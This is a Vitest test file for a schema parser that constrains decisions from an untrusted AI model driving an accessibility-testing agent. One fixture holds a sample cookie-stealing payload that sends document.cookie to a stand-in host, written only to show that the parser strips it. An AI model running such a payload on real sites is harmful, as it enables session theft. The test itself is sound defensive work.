import { describe, expect, it } from "vitest";

import {
  parseAgentDecision,
  safeParseAgentDecision,
  type AgentDecision,
} from "@/lib/shared/domain";

/**
 * `AgentDecision` is the only channel from an untrusted model into the system,
 * so these tests are about what the type makes *impossible*, not just what it
 * accepts.
 */

const CONTINUE = {
  decision: "CONTINUE",
  action: "TAB",
  reasoning: "Moving forward through the header.",
  confidence: 0.8,
  suspectedIssue: null,
  targetElementId: null,
};

describe("parseAgentDecision", () => {
  it("accepts a well-formed CONTINUE", () => {
    const decision = parseAgentDecision(CONTINUE);

    expect(decision.decision).toBe("CONTINUE");
    expect(decision.action).toBe("TAB");
  });

  it("accepts STOP with no action", () => {
    const decision = parseAgentDecision({
      decision: "STOP",
      action: null,
      reasoning: "Every control has been reached.",
      confidence: 0.95,
      suspectedIssue: null,
      targetElementId: null,
    });

    expect(decision.decision).toBe("STOP");
    expect(decision.action).toBeNull();
  });

  it("rejects an action outside the allowlist", () => {
    expect(safeParseAgentDecision({ ...CONTINUE, action: "ENTER" }).success).toBe(false);
  });

  // The loop terminates on STOP. An action riding along with it would be a
  // keypress nobody asked for.
  it("rejects STOP that carries an action", () => {
    expect(
      safeParseAgentDecision({
        decision: "STOP",
        action: "TAB",
        reasoning: "Done.",
        confidence: 0.9,
        suspectedIssue: null,
        targetElementId: null,
      }).success,
    ).toBe(false);
  });

  it("rejects a non-STOP decision with no action", () => {
    expect(safeParseAgentDecision({ ...CONTINUE, action: null }).success).toBe(false);
  });

  // A suspicion with no type cannot be corroborated, so it cannot become a
  // finding — INVESTIGATE and REPORT must name what they are about.
  it.each(["INVESTIGATE", "REPORT"])("requires %s to name a finding type", (kind) => {
    expect(
      safeParseAgentDecision({ ...CONTINUE, decision: kind, suspectedIssue: null })
        .success,
    ).toBe(false);

    expect(
      safeParseAgentDecision({
        ...CONTINUE,
        decision: kind,
        suspectedIssue: "SUSPICIOUS_FOCUS_CYCLE",
      }).success,
    ).toBe(true);
  });

  it("rejects CONTINUE that claims a suspicion", () => {
    expect(
      safeParseAgentDecision({
        ...CONTINUE,
        suspectedIssue: "SUSPICIOUS_FOCUS_CYCLE",
      }).success,
    ).toBe(false);
  });

  it("rejects an unknown finding type", () => {
    expect(
      safeParseAgentDecision({
        ...CONTINUE,
        decision: "REPORT",
        suspectedIssue: "COLOR_CONTRAST",
      }).success,
    ).toBe(false);
  });

  it("rejects an unknown decision", () => {
    expect(safeParseAgentDecision({ ...CONTINUE, decision: "CLICK" }).success).toBe(
      false,
    );
    expect(safeParseAgentDecision({ ...CONTINUE, decision: "" }).success).toBe(false);
  });

  it.each([-0.1, 1.1, Number.NaN, "high"])("rejects confidence %s", (value: unknown) => {
    expect(safeParseAgentDecision({ ...CONTINUE, confidence: value }).success).toBe(
      false,
    );
  });

  it("rejects empty reasoning — a decision with no explanation is not evidence", () => {
    expect(safeParseAgentDecision({ ...CONTINUE, reasoning: "" }).success).toBe(false);
  });

  // The model has no channel for a selector, a URL, or a script: fields it
  // invents do not survive parsing, so nothing downstream can act on them.
  it("strips fields the model invents", () => {
    const parsed = parseAgentDecision({
      ...CONTINUE,
      selector: "#admin",
      script: "fetch('https://evil.test?c=' + document.cookie)",
      url: "https://evil.test",
    });

    expect(parsed).not.toHaveProperty("selector");
    expect(parsed).not.toHaveProperty("script");
    expect(parsed).not.toHaveProperty("url");
    expect(Object.keys(parsed).sort()).toEqual([
      "action",
      "confidence",
      "decision",
      "reasoning",
      "suspectedIssue",
      "targetElementId",
    ]);
  });

  it("throws on malformed input rather than returning a default action", () => {
    expect(() => parseAgentDecision({})).toThrow();
    expect(() => parseAgentDecision(null)).toThrow();
    expect(() => parseAgentDecision("TAB")).toThrow();
  });

  it("narrows on the discriminant", () => {
    const decision: AgentDecision = parseAgentDecision({
      ...CONTINUE,
      decision: "REPORT",
      suspectedIssue: "UNREACHABLE_INTERACTIVE_ELEMENT",
    });

    if (decision.decision === "REPORT") {
      // Reachable only because the union narrowed: `suspectedIssue` is not
      // nullable on this member.
      expect(decision.suspectedIssue).toBe("UNREACHABLE_INTERACTIVE_ELEMENT");
    } else {
      expect.unreachable("expected a REPORT decision");
    }
  });
});
